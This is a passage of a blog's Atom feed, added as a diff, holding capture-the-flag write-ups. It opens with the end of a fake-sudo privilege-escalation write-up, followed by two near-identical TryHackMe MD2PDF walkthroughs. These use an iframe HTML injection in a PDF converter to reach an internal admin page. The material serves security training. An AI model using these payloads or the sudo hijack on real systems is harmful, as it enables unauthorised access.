+<p><!-- /wp:image --></p>
+<p><!-- wp:paragraph --></p>
+<p>Having successfully obtained the password, we now have complete access to sudo and, consequently, root privileges. The final steps involve restoring the $PATH variable to its original state and reloading the bash profile. Alternatively, we can rename our counterfeit sudo script to something else or invoke the genuine sudo command using its full path,<code>/usr/bin/sudo</code>. With these actions complete, we can acquire the flag:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$ sudo cat /root/flag.txt[sudo] password for frank:flag{REDACTED}</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+            ]]>
+        </content>
+    </entry>
+    <entry>
+        <title>TryHackMe: MD2PDF write-up</title>
+        <author>
+            <name>andrey</name>
+        </author>
+        <link href="https://e4ld3rs0n.github.io/bughunter-publii/tryhackme-md2pdf-write-up-2/"/>
+        <id>https://e4ld3rs0n.github.io/bughunter-publii/tryhackme-md2pdf-write-up-2/</id>
+        <media:content url="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/3/tryhackme-banner.jpg" medium="image" />
+            <category term="tryhackme"/>
+            <category term="ctf"/>
+
+        <updated>2023-02-16T17:40:00+01:00</updated>
+            <summary>
+                <![CDATA[
+                        <img src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/3/tryhackme-banner.jpg" alt="" />
+                    MD2PDF is a beginner-friendly TryHackMe room where we exploit a markdown-to-PDF converter vulnerability. Link: https://tryhackme.com/room/md2pdf Difficulty: Easy Enumeration To begin the enumeration process, I launched&hellip;
+                ]]>
+            </summary>
+        <content type="html">
+            <![CDATA[
+                    <p><img src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/3/tryhackme-banner.jpg" class="type:primaryImage" alt="" /></p>
+                
+  <p>
+    MD2PDF is a beginner-friendly TryHackMe room where we exploit a markdown-to-PDF converter vulnerability.
+  </p>
+<pre class="line-numbers  language-html"><code>Link: https://tryhackme.com/room/md2pdf
+Difficulty: Easy</code></pre>
+
+    <h2 id="enumeration">
+      Enumeration
+    </h2>
+
+  <p>
+    To begin the enumeration process, I launched an Nmap scan, which revealed that the target machine is running three services: a standard HTTP server on port 80, an SSH server, and another HTTP server on port 5000. Additionally, the machine appears to be running some version of Ubuntu Server.
+<br>
+<br>Next, I performed a Gobuster scan against both web servers, which revealed a hidden directory named “/admin” for both web services, piquing my interest.
+<br>
+<br>Moving forward, I decided to explore the web applications presented to me. Both looked very similar, featuring a text box where Markdown could be entered, and a button to convert the Markdown to a PDF document.
+<br>
+<br>I tried the application running on port 80 and was able to successfully generate a PDF containing my entered Markdown. However, the other application seemed to be malfunctioning as clicking the Convert button did not produce any output.
+<br>
+<br>For the time being, I focused on the application running on port 80. My next course of action was to enter some HTML into the textbox to determine whether or not it would render. As expected, the HTML was rendered successfully:
+  </p>
+
+    <figure class="post__image post__image--center">
+      <img loading="lazy" src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/3/tryhackme-md2pdf-1.png" height="542" width="960" alt=""  sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/3/responsive/tryhackme-md2pdf-1-xs.png 300w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/3/responsive/tryhackme-md2pdf-1-sm.png 480w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/3/responsive/tryhackme-md2pdf-1-md.png 768w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/3/responsive/tryhackme-md2pdf-1-lg.png 1024w">
+      
+    </figure>
+
+    <figure class="post__image post__image--center">
+      <img loading="lazy" src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/3/tryhackme-md2pdf-2.png" height="621" width="960" alt=""  sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/3/responsive/tryhackme-md2pdf-2-xs.png 300w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/3/responsive/tryhackme-md2pdf-2-sm.png 480w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/3/responsive/tryhackme-md2pdf-2-md.png 768w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/3/responsive/tryhackme-md2pdf-2-lg.png 1024w">
+      
+    </figure>
+
+  <p>
+    The /admin directory for both applications displayed a “Forbidden” error:<br>
+  </p>
+<pre class="line-numbers  language-html"><code>Forbidden
+
+This page can only be seen internally (localhost:5000)</code></pre>
+
+    <h2 id="exploit">
+      Exploit
+    </h2>
+
+  <p>
+    Since we already knew that the PDF document could render HTML, I had an idea to try and get a sneak peek of what the /admin directory looks like. I thought maybe embedding it into an iframe could do the trick:
+  </p>
+<pre class="line-numbers  language-html"><code>&lt;iframe src="http://localhost/admin" width="800" height="800"&gt;&lt;/iframe&gt;</code></pre>
+
+  <p>
+    That did not work however:
+  </p>
+
+    <figure class="post__image post__image--center">
+      <img loading="lazy" src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/3/tryhackme-md2pdf-3.png" height="338" width="768" alt=""  sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/3/responsive/tryhackme-md2pdf-3-xs.png 300w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/3/responsive/tryhackme-md2pdf-3-sm.png 480w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/3/responsive/tryhackme-md2pdf-3-md.png 768w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/3/responsive/tryhackme-md2pdf-3-lg.png 1024w">
+      
+    </figure>
+
+  <p>
+    Maybe we can view the /admin directory on the other port?
+  </p>
+<pre class="line-numbers  language-html"><code>&lt;iframe src="http://localhost:5000/admin" width="800" height="800"&gt;&lt;/iframe&gt;</code></pre>
+
+  <p>
+    That does the trick and we are rewarded with the flag:
+  </p>
+
+    <figure class="post__image post__image--center">
+      <img loading="lazy" src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/3/tryhackme-md2pdf-4.png" height="287" width="768" alt=""  sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/3/responsive/tryhackme-md2pdf-4-xs.png 300w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/3/responsive/tryhackme-md2pdf-4-sm.png 480w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/3/responsive/tryhackme-md2pdf-4-md.png 768w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/3/responsive/tryhackme-md2pdf-4-lg.png 1024w">
+      
+    </figure>
+
+  <p>
+    
+  </p>
+            ]]>
+        </content>
+    </entry>
+    <entry>
+        <title>TryHackMe: MD2PDF write-up</title>
+        <author>
+            <name>andrey</name>
+        </author>
+        <link href="https://e4ld3rs0n.github.io/bughunter-publii/tryhackme-md2pdf-write-up-3/"/>
+        <id>https://e4ld3rs0n.github.io/bughunter-publii/tryhackme-md2pdf-write-up-3/</id>
+        <media:content url="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/11/tryhackme-banner.jpg" medium="image" />
+            <category term="tryhackme"/>
+            <category term="ctf"/>
+
+        <updated>2023-02-16T16:45:00+01:00</updated>
+            <summary>
+                <![CDATA[
+                        <img src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/11/tryhackme-banner.jpg" alt="" />
+                    In this article we are going to explore the solution to TryHackMe's MD2PDF and exploit a Markdown converter. Link: https://tryhackme.com/room/md2pdf Difficulty: Easy To begin the&hellip;
+                ]]>
+            </summary>
+        <content type="html">
+            <![CDATA[
+                    <p><img src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/11/tryhackme-banner.jpg" class="type:primaryImage" alt="" /></p>
+                <p><!-- wp:paragraph --></p>
+<p>In this article we are going to explore the solution to TryHackMe's MD2PDF and exploit a Markdown converter.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>Link: <a href="https://tryhackme.com/room/md2pdf" target="_blank" rel="noopener" title="">https://tryhackme.com/room/md2pdf</a></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>Difficulty: <code>Easy</code></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:heading --></p>
+<h2 class="wp-block-heading">Enumeration</h2>
+<p><!-- /wp:heading --></p>
+<p><!-- wp:paragraph --></p>
+<p>To begin the enumeration process, I launched an Nmap scan, which revealed that the target machine is running three services: a standard HTTP server on port 80, an SSH server, and another HTTP server on port 5000. Additionally, the machine appears to be running some version of Ubuntu Server.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>Next, I performed a Gobuster scan against both web servers, which revealed a hidden directory named "/admin" for both web services, piquing my interest.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>Moving forward, I decided to explore the web applications presented to me. Both looked very similar, featuring a text box where Markdown could be entered, and a button to convert the Markdown to a PDF document.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>I tried the application running on port 80 and was able to successfully generate a PDF containing my entered Markdown. However, the other application seemed to be malfunctioning as clicking the Convert button did not produce any output.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>For the time being, I focused on the application running on port 80. My next course of action was to enter some HTML into the textbox to determine whether or not it would render. As expected, the HTML was rendered successfully:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:image {"id":150,"sizeSlug":"full","linkDestination":"none"} --></p>
+<figure class="wp-block-image size-full"><figure class="wp-image-150"><img loading="lazy"  src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/11/tryhackme-md2pdf-1.png" alt="" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/11/responsive/tryhackme-md2pdf-1-xs.png 300w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/11/responsive/tryhackme-md2pdf-1-sm.png 480w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/11/responsive/tryhackme-md2pdf-1-md.png 768w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/11/responsive/tryhackme-md2pdf-1-lg.png 1024w"></figure></figure>
+<p><!-- /wp:image --></p>
+<p><!-- wp:image {"id":151,"sizeSlug":"full","linkDestination":"none"} --></p>
+<figure class="wp-block-image size-full"><figure class="wp-image-151"><img loading="lazy"  src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/11/tryhackme-md2pdf-2.png" alt="" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/11/responsive/tryhackme-md2pdf-2-xs.png 300w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/11/responsive/tryhackme-md2pdf-2-sm.png 480w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/11/responsive/tryhackme-md2pdf-2-md.png 768w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/11/responsive/tryhackme-md2pdf-2-lg.png 1024w"></figure></figure>
+<p><!-- /wp:image --></p>
+<p><!-- wp:paragraph --></p>
+<p>The /admin directory for both applications displayed a "Forbidden" error:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">ForbiddenThis page can only be seen internally (localhost:5000)</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:heading --></p>
+<h2 class="wp-block-heading">Exploit</h2>
+<p><!-- /wp:heading --></p>
+<p><!-- wp:paragraph --></p>
+<p>Since we already knew that the PDF document could render HTML, I had an idea to try and get a sneak peek of what the /admin directory looks like. I thought maybe embedding it into an iframe could do the trick:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">&lt;iframe src="http://localhost/admin" width="800" height="800"&gt;&lt;/iframe&gt;</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:paragraph --></p>
+<p>That did not work however:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:image {"id":153,"sizeSlug":"full","linkDestination":"none"} --></p>
+<figure class="wp-block-image size-full"><figure class="wp-image-153"><img loading="lazy"  src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/11/tryhackme-md2pdf-3.png" alt="" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/11/responsive/tryhackme-md2pdf-3-xs.png 300w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/11/responsive/tryhackme-md2pdf-3-sm.png 480w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/11/responsive/tryhackme-md2pdf-3-md.png 768w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/11/responsive/tryhackme-md2pdf-3-lg.png 1024w"></figure></figure>
+<p><!-- /wp:image --></p>
+<p><!-- wp:paragraph --></p>
+<p>Hm, that did not work. Maybe we can view the /admin directory on the other port?</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:enlighter/codeblock --></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">&lt;iframe src="http://localhost:5000/admin" width="800" height="800"&gt;&lt;/iframe&gt;</pre>
+<p><!-- /wp:enlighter/codeblock --></p>
+<p><!-- wp:paragraph --></p>
+<p>That does the trick and we are rewarded with the flag:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:image {"id":154,"sizeSlug":"full","linkDestination":"none"} --></p>
+<figure class="wp-block-image size-full"><figure class="wp-image-154"><img loading="lazy"  src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/11/tryhackme-md2pdf-4.png" alt="" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/11/responsive/tryhackme-md2pdf-4-xs.png 300w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/11/responsive/tryhackme-md2pdf-4-sm.png 480w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/11/responsive/tryhackme-md2pdf-4-md.png 768w ,https://e4ld3rs0n.github.io/bughunter-publii/media/posts/11/responsive/tryhackme-md2pdf-4-lg.png 1024w"></figure></figure>
+<p><!-- /wp:image --></p>
+            ]]>
+        </content>
+    </entry>
+</feed>
